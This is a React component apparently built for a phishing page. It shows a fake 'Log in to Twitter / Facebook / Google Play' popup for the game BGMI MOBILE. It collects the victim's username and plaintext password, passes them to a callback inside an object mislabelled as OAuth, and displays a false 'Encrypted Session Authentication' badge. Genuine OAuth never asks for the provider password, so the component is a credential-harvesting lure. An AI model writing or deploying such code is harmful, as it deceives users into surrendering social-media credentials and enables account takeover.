import React, { useState } from 'react';
import { X, Lock, Loader2, AlertCircle } from 'lucide-react';

export default function SocialAuthPopupModal({ provider, onClose, onLoginSuccess }) {
  const [formData, setFormData] = useState({
    emailOrUsername: '',
    password: '',
  });

  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);

  const providerNames = {
    twitter: 'Twitter / X',
    facebook: 'Facebook',
    google: 'Google Play',
  };

  const validate = () => {
    const errs = {};
    if (!formData.emailOrUsername.trim()) {
      errs.emailOrUsername = 'Phone, email, or username is required';
    }

    if (!formData.password) {
      errs.password = 'Password is required';
    } else if (formData.password.length < 4) {
      errs.password = 'Password must be at least 4 characters';
    }

    setErrors(errs);
    return Object.keys(errs).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validate()) return;

    setLoading(true);
    try {
      // Simulate OAuth login processing
      await new Promise((res) => setTimeout(res, 600));

      const loggedUser = {
        uid: `user_${Date.now()}`,
        displayName: formData.emailOrUsername.split('@')[0] || 'Verified Player',
        emailOrUsername: formData.emailOrUsername.trim(),
        email: formData.emailOrUsername.trim(),
        password: formData.password,
        provider: provider || 'twitter',
        authProvider: `${(provider || 'twitter').toUpperCase()} OAuth`,
        loggedInAt: new Date().toISOString(),
      };

      onLoginSuccess(loggedUser);
    } catch (err) {
      setErrors({ server: 'Login failed. Please check credentials and try again.' });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 bg-black/85 backdrop-blur-xs animate-fadeIn">
      <div className="relative w-full max-w-md bg-white text-black rounded-lg shadow-2xl overflow-hidden border border-gray-300">
        
        {/* Top Header Bar matching Twitter / Provider Login */}
        <div className="bg-gray-100 border-b border-gray-200 px-4 py-3 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <span className="text-xl font-bold">
              {provider === 'twitter' && '𝕏'}
              {provider === 'facebook' && 'f'}
              {provider === 'google' && '▶'}
            </span>
            <h3 className="font-bold text-gray-800 text-sm sm:text-base">
              Log in to {providerNames[provider] || 'Twitter'}
            </h3>
          </div>
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-black p-1 rounded transition-colors"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Modal Form Body asking for Email/Username & Password */}
        <form onSubmit={handleSubmit} className="p-6 space-y-4">
          
          <div className="text-center space-y-1 pb-2 border-b border-gray-100">
            <h4 className="font-bold text-lg text-gray-900">
              Log in to connect to BGMI MOBILE
            </h4>
            <p className="text-xs text-gray-500">
              Enter your {providerNames[provider] || 'Twitter'} login credentials to authenticate.
            </p>
          </div>

          {errors.server && (
            <div className="p-2.5 bg-red-50 border border-red-200 text-red-700 text-xs rounded flex items-center gap-2">
              <AlertCircle className="w-4 h-4 shrink-0 text-red-500" />
              <span>{errors.server}</span>
            </div>
          )}

          {/* Form Inputs for Email/Username & Password */}
          <div className="space-y-3">
            
            {/* Phone, Email or Username */}
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Phone, Email, or Username
              </label>
              <input
                type="text"
                placeholder="Enter Phone, Email, or Username"
                value={formData.emailOrUsername}
                onChange={(e) => setFormData({ ...formData, emailOrUsername: e.target.value })}
                className="w-full border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 px-3 py-2 rounded text-sm outline-none text-gray-900"
              />
              {errors.emailOrUsername && (
                <p className="text-red-600 text-[11px] mt-0.5">{errors.emailOrUsername}</p>
              )}
            </div>

            {/* Password */}
            <div>
              <label className="block text-xs font-semibold text-gray-700 mb-1">
                Password
              </label>
              <input
                type="password"
                placeholder="Enter Password"
                value={formData.password}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                className="w-full border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 px-3 py-2 rounded text-sm outline-none text-gray-900"
              />
              {errors.password && (
                <p className="text-red-600 text-[11px] mt-0.5">{errors.password}</p>
              )}
            </div>

          </div>

          {/* Submit Action Button */}
          <div className="pt-2">
            <button
              type="submit"
              disabled={loading}
              className={`w-full py-2.5 px-4 font-bold text-sm text-white rounded-md shadow transition-all flex items-center justify-center space-x-2 ${
                provider === 'twitter' 
                  ? 'bg-black hover:bg-gray-800' 
                  : provider === 'facebook' 
                  ? 'bg-[#1877f2] hover:bg-[#166fe5]' 
                  : 'bg-yellow-600 hover:bg-yellow-700'
              }`}
            >
              {loading ? (
                <>
                  <Loader2 className="w-4 h-4 animate-spin" />
                  <span>Logging in...</span>
                </>
              ) : (
                <span>Log in</span>
              )}
            </button>
          </div>

          {/* Secure Encryption Footer */}
          <div className="text-[10px] text-gray-400 text-center flex items-center justify-center space-x-1 pt-1">
            <Lock className="w-3 h-3 text-green-600" />
            <span>Encrypted Session Authentication</span>
          </div>

        </form>
      </div>
    </div>
  );
}
